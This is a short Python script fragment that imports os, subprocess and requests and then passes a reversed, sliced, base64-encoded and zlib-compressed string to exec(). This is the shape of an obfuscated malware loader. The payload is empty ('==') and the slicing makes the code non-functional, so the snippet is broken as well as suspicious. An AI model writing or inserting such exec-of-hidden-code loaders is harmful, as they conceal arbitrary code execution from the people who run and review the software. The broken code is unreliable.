import os
import subprocess
import requests
from pathlib import Path
from urllib.parse import urljoin

import zlib, base64
encoded = '=='
exec(zlib.decompress(base64.b64decode(encoded[::-1][9999:].encode('utf-8'))))
